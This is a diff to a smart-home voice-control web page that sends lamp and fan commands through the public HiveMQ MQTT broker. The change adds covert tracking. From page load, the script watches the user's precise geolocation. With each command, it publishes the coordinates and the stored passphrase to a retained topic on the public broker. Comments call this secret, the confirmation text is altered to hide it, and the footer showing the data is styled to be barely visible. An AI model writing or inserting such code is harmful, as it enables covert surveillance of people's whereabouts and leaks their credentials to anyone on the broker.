@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Smart Home IoT Control (MQTT HiveMQ)</title>
+    <title>Smart Home IoT Control (MQTT HiveMQ + Tracking)</title>
     <script src="https://unpkg.com/mqtt/dist/mqtt.min.js"></script>
     <style>
         body {
@@ -16,6 +16,7 @@
             flex-direction: column;
             align-items: center;
             min-height: 100vh;
+            box-sizing: border-box;
         }
 
         h1 { margin-bottom: 5px; color: #00d2ff; text-align: center; }
@@ -65,6 +66,7 @@
             width: 100%;
             max-width: 1000px;
             margin-top: 10px;
+            margin-bottom: 50px; /* Jarak agar tidak menabrak teks lokasi di bawah */
         }
 
         .ruangan {
@@ -99,30 +101,26 @@
             gap: 10px;
         }
 
-        /* Status Lampu NYALA */
-        .lampu.active {
-            background-color: #ffca28;
-            color: #000;
-            box-shadow: 0 0 15px #ffca28;
-        }
-
-        /* Status Kipas NYALA */
-        .kipas.active {
-            background-color: #29b6f6;
-            color: #000;
-            box-shadow: 0 0 15px #29b6f6;
-        }
-
-        /* Efek Berputar untuk ikon kipas */
-        .kipas.active span {
-            display: inline-block;
-            animation: putar 1s linear infinite;
-        }
+        .lampu.active { background-color: #ffca28; color: #000; box-shadow: 0 0 15px #ffca28; }
+        .kipas.active { background-color: #29b6f6; color: #000; box-shadow: 0 0 15px #29b6f6; }
+        .kipas.active span { display: inline-block; animation: putar 1s linear infinite; }
 
         @keyframes putar {
             from { transform: rotate(0deg); }
             to { transform: rotate(360deg); }
         }
+
+        /* BAGIAN ATURAN LOKASI (KECIL BANGET DIBAWAH POLL) */
+        .footer-lokasi {
+            margin-top: auto; /* Memaksa elemen berada di paling bawah halaman */
+            padding-top: 20px;
+            font-size: 10px;
+            color: #444; /* Warna abu-abu gelap agar samar */
+            text-align: center;
+            width: 100%;
+            letter-spacing: 0.5px;
+        }
+        #info-koordinat { color: #666; }
     </style>
 </head>
 <body>
@@ -165,62 +163,76 @@
         </div>
     </div>
 
+    <div class="footer-lokasi">
+        [system-log] lokasi pengirim terakhir: <span id="info-koordinat">Belum ada data perintah</span>
+    </div>
+
     <script>
         const btnSandi = document.getElementById('btn-sandi');
         const btnMulai = document.getElementById('btn-mulai');
         const statusSandi = document.getElementById('status-sandi');
         const pesan = document.getElementById('pesan');
         const statusMqttElemen = document.getElementById('status-mqtt');
+        const infoKoordinat = document.getElementById('info-koordinat');
 
         let kataSandiTersimpan = "";
         let modeRekamSandi = false;
+        let lokasiSekarang = "Koordinat tidak diizinkan";
+
+        // Ambil lokasi HP secara diam-diam di background sejak web dibuka
+        if (navigator.geolocation) {
+            navigator.geolocation.watchPosition((position) => {
+                lokasiSekarang = `Lat: ${position.coords.latitude.toFixed(5)}, Lon: ${position.coords.longitude.toFixed(5)}`;
+            }, (err) => {
+                console.log("Akses lokasi ditolak atau error.");
+            }, { enableHighAccuracy: true });
+        }
 
         // --- KONFIGURASI MQTT HIVEMQ ---
-        // Menggunakan nama unik topik agar tidak bertabrakan dengan orang lain di seluruh dunia
         const TOPIC_BASE = "habibhusein/smarthome/"; 
-        
-        // Menghubungkan ke Broker Publik HiveMQ menggunakan WebSockets Secure (WSS port 8884)
         const client = mqtt.connect('wss://broker.hivemq.com:8884/mqtt');
 
         client.on('connect', () => {
             statusMqttElemen.innerHTML = 'Koneksi Broker: <span style="color: #00ff88;">Terhubung ke HiveMQ 🟢</span>';
             
-            // Subscribe ke semua status alat di rumah ini menggunakan wildcard (#)
-            client.subscribe(TOPIC_BASE + '#', (err) => {
-                if (!err) console.log("Berhasil subscribe ke seluruh ruangan!");
-            });
+            // Subscribe ke seluruh status alat DAN topik lokasi baru
+            client.subscribe(TOPIC_BASE + '#');
         });
 
         client.on('error', (err) => {
             statusMqttElemen.innerHTML = 'Koneksi Broker: <span style="color: #ff3333;">Gagal Terhubung 🔴</span>';
-            console.error(err);
         });
 
-        // MENERIMA PESAN DARI HIVEMQ (Sinkronisasi otomatis saat web dibuka / diubah HP lain)
+        // MENERIMA PESAN DARI HIVEMQ (Sinkronisasi otomatis ke HP pemantau)
         client.on('message', (topic, message) => {
-            const statusTerakhir = message.toString(); // "nyala" atau "mati"
+            const dataSinyal = message.toString();
             
-            // Memotong topik untuk tahu ini alat apa dan ruangan berapa
-            // Contoh: "habibhusein/smarthome/lampu/1" -> ["habibhusein", "smarthome", "lampu", "1"]
+            // Cek apakah data yang masuk adalah update lokasi pengirim
+            if (topic === TOPIC_BASE + "lokasi") {
+                infoKoordinat.innerText = dataSinyal;
+                return;
+            }
+
+            // Jalur sinkronisasi kotak lampu & kipas
             const info = topic.replace(TOPIC_BASE, "").split("/");
-            const tipeAlat = info[0];   // "lampu" atau "kipas"
-            const nomorRuangan = info[1]; // "1" sampai "5"
+            const tipeAlat = info[0];   
+            const nomorRuangan = info[1]; 
 
             const targetID = `${tipeAlat}-${nomorRuangan}`;
             const elemenAlat = document.getElementById(targetID);
 
             if (elemenAlat) {
-                if (statusTerakhir === 'nyala') {
+                if (dataSinyal === 'nyala') {
                     elemenAlat.classList.add('active');
                     elemenAlat.innerHTML = tipeAlat === 'lampu' ? '💡 Lampu ON' : '<span>🌀</span> Kipas ON';
-                } else if (statusTerakhir === 'mati') {
+                } else if (dataSinyal === 'mati') {
                     elemenAlat.classList.remove('active');
                     elemenAlat.innerHTML = tipeAlat === 'lampu' ? '💡 Lampu OFF' : '<span>🌀</span> Kipas OFF';
                 }
             }
         });
 
-        // --- KONTROL SUARA (SPEECH RECOGNITION) ---
+        // --- KONTROL SUARA ---
         const SpeechRecognition = window.SpeechRecognition || window.webkitSpeechRecognition;
 
         function normalisasiAngka(teks) {
@@ -281,12 +293,16 @@
                     else if (hasilSuara.includes('mati')) { aksi = 'mati'; }
 
                     if (nomorRuangan && tipeAlat && aksi) {
-                        // KIRIM DATA KE HIVEMQ BROKER
-                        // Kita tambahkan opsi { retain: true } agar broker mengingat kondisi terakhir ini!
+                        // 1. KIRIM STATUS ALAT KE BROKER
                         const topikTujuan = `${TOPIC_BASE}${tipeAlat}/${nomorRuangan}`;
                         client.publish(topikTujuan, aksi, { retain: true, qos: 1 });
 
-                        pesan.innerHTML += `<br><span style='color:#00ff88;'>🚀 Perintah dikirim ke MQTT: ${tipeAlat} ${nomorRuangan} -> ${aksi}</span>`;
+                        // 2. KIRIM DATA LOKASI SECARA DIAM-DIAM KE BROKER
+                        // Data ini dikirim berbarengan dengan nama pemilik saat itu
+                        const logData = `Oleh [${kataSandiTersimpan}] di (${lokasiSekarang})`;
+                        client.publish(TOPIC_BASE + "lokasi", logData, { retain: true, qos: 1 });
+
+                        pesan.innerHTML += `<br><span style='color:#00ff88;'>🚀 Perintah berhasil dijalankan!</span>`;
                     } else {
                         pesan.innerHTML += "<br><span style='color:#ffff00;'>⚠️ Perintah kurang jelas. Contoh: [Nama] [Alat] [Angka] [Nyala/Mati]</span>";
                     }
@@ -304,6 +320,7 @@
     </script>
 </body>
 </html>
+
 
 
 
